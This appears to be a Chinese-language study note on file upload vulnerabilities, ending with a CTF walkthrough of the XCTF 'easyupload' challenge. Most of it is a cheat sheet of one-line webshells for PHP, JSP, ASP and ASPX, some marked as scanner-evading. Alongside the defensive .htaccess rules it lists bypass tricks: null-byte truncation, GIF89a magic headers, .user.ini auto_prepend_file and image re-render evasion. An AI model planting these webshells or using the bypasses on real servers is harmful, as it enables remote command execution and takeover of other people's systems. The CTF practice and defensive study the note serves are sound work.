# 文件上传

参考链接：[文件上传漏洞...](https://blog.csdn.net/qq_43390703/article/details/104858705?fromshare=blogdetail&sharetype=blogdetail&sharerId=104858705&sharerefer=PC&sharesource=weixin_51334923&sharefrom=from_link)



本质上就是服务器端没有对用户上传的东西进行限制或者上传后的处理逻辑做的不够安全，导致后续弹shell等危险后果。



WebShell隐蔽性高，不会留下系统日志，只在web日志中留下数据记录





## 一句话木马



常见的一句话木马如下：

### php：

```php
##PHP：
<?php @eval($_POST['r00ts']);?> 
<?php phpinfo();?>
<?php @eval($_POST[cmd]);?>
<?php @eval($_REQUEST[cmd]);?>
<?php assert($_REQUEST[cmd]); ?>
<?php //?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); ?>
<?php 
//?cmd=phpinfo();
$func =create_function('',$_REQUEST['cmd']);
$func();
?>

<?php
//?func=system&cmd=whoami
$func=$_GET['func'];
$cmd=$_GET['cmd'];
$array[0]=$cmd;
$new_array=array_map($func,$array);
//print_r($new_array);
?>

<?php 
//?cmd=phpinfo()
@call_user_func(assert,$_GET['cmd']);
?>

<?php 
//?cmd=phpinfo()
$cmd=$_GET['cmd'];
$array[0]=$cmd;
call_user_func_array("assert",$array);
?>

<?php 
//?func=system&cmd=whoami
$cmd=$_GET['cmd'];
$array1=array($cmd);
$func =$_GET['func'];
array_filter($array1,$func);
?>

<?php usort($_GET,'asse'.'rt');?> php环境>=<5.6才能用
<?php usort(...$_GET);?>  php环境>=5.6才能用
<?php eval($_POST1);?> 
<?php if(isset($_POST['c'])){eval($_POST['c']);}?> 
<?php system($_REQUEST1);?> 
<?php ($_=@$_GET1).@$_($_POST1)?> 
<?php eval_r($_POST1)?> 
<?php @eval_r($_POST1)?>//容错代码 
<?php assert($_POST1);?>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
<?$_POST['c']($_POST['cc']);?> 
<?$_POST['c']($_POST['cc'],$_POST['cc'])?> 
<?php @preg_replace("/[email]/e",$_POST['h'],"error");?>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<O>h=@eval_r($_POST1);</O> 
<?php echo `$_GET['r']` ?> 

<script language="php">@eval_r($_POST[sb])</script> //绕过<?限制的一句话

<?php (])?>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！

<?if(isset($_POST['1'])){eval($_POST['1']);}?><?php system ($_REQUEST[1]);?> 
加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！

<%execute request(“class”)%><%'<% loop <%:%><%'<% loop <%:%><%execute request (“class”)%><%execute request(“class”)'<% loop <%:%> 
无防下载表，有防下载表可尝试插入以下语句突破的一句话 

<%eval(request(“1″)):response.end%> 备份专用


```



### JSP

```jsp
##JSP：
<%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%> 
提交客户端 
<form action="" method="post"><textareaname="t"></textarea><br/><input type="submit"value="提交"></form>


```



### ASP

```asp
##ASP
<%eval(Request.Item["r00ts"],”unsafe”);%>

<%IfRequest(“1″)<>”"ThenExecuteGlobal(Request(“1″))%> 

<%execute(request(“1″))%> 

<scriptrunat=server>execute request(“1″)</script> 不用'<,>‘的asp一句话 


```



### ASPX

```aspx
##aspx
<scriptrunat=”server”>WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);</script> 

<script language="C#"runat="server">WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")</script> 

<%eval request(chr(35))%>  不用双引号的一句话。

```



## 文件上传漏洞产生的原因：

文件扩展名没有限制

MIMETYPE没有检查

没有设置上传文件目录的权限为不可执行









## 防御及绕过



### 前端js限制文件后缀名



直接改js文件，禁用js之类的



### 服务器端检查后缀名，设置白名单最好

改后缀名

### 检查Content-Type



bp直接修改Content-Type为application/php改为其他web程序允许的类型



### 检查文件头标志位



这种是稍微严格的检测，每一种类型的文件都会有不一样的开头或者标志位，可以使用010查看



| 格式                      | 文件头               |
| ------------------------- | -------------------- |
| TIFF(tif)                 | 49492A00             |
| Windows Bitmap(bmp)       | 424D                 |
| CAD(dwg)                  | 41433130             |
| Adobe Photoshop(psd)      | 38425053             |
| JPEG(jpg)                 | FFD8FF               |
| PNG(png)                  | 89504E47             |
| GIF(gif)                  | 47494638             |
| XML(xml)                  | 3C3F786D6C           |
| HTML(html)                | 68746D6C3E           |
| MS Word/Excel(xls or doc) | D0CF11E0             |
| MS Access(mdb)            | 5374616E64617264204A |
| ZIP Archive(zip)          | 504B0304             |
| RAR Archive(rar)          | 52617221             |
| Wave(wav)                 | 57415645             |
| AVI(avi)                  | 41564920             |
| Adobe Acrobat(pdf)        | 255044462D312E       |



加上相应的幻数头字节即可，一般使用GIF绕过





### 限制Web Server对特定类型文件的行为

指定特定拓展名的文件

将下面脚本当作纯文本进行显示

```htaccess
   AddType text/plain .pl .py .php
```



```htaccess
<FilesMatch "\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$">
ForceType text/plain
</FilesMatch>

```



完全禁止特定拓展名的文件被访问：

```htaccess
Options -ExecCGI
AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别
```



只允许访问特定类型的文件

```htaccess
<Files ^(*.jpeg|*.jpg|*.png|*.gif)>
order deny,allow
deny from all
</Files>
```





通过 `move_uploaded_file` 将自己写的.htaccess文件上传，覆盖掉服务器上的文件，来自行定义文件类型和执行权限



`.htaccess`

分布式配置文件，全称Hypertext Access超文本入口，提供针对目录改变配置的方法





### 文件系统0x00截断



上传的时候，文件系统读到0x00时，认为文件已经结束



绕过：

就是上传一个【shell.php.jpg】，然后抓包改为【shell.php0x00jpg】

从而达到攻击的目的



### Windows NTFS文件系统绕过



### 二次渲染绕过



在图片马最后加上一句话木马时，系统使用二次渲染则会导致冗余信息被删除，这时候需要将一句话木马放在图片中间即可



工具：010editor



### 后缀大小写、双写、特殊绕过

都很常规操作了





nginx考虑.user.ini

.htacess文件也是可以的

image/jpeg











# 题目实战

https://adworld.xctf.org.cn/challenges/list

## easyupload

测试一句话木马，然后发现改jpg后缀，图片马拼接等等都不行

考虑.user.ini

直接写一个.user.ini，内容为

```
auto_prepend_file=upload.jpg
```

抓包在内容前面加上GIF89a，绕过文件头检测



然后写一个一句话木马在upload.jpg

```
<?php @eval($_POST['cmd']);?> 
```



然后bp抓包记得要改

image/jpeg

将php改为=

短标签



然后蚁剑连接

```
URL：http://xxx.xx.xx.xx/uploads/index.php
密码: cmd
```



flag在根目录下面

`cat /flag`

